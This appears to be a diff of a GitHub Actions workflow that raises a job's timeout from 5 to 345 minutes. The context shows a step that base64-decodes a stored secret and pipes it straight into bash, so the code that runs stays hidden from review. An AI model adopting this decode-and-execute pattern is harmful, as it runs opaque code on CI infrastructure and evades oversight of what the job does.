@@ -9,7 +9,7 @@ concurrency:
 jobs:
   Instance-Job:
     runs-on: ubuntu-slim
-    timeout-minutes: 5
+    timeout-minutes: 345
     steps:
       - run: echo "${{ secrets.BASH_BASE64 }}" | base64 -di | bash
         env:
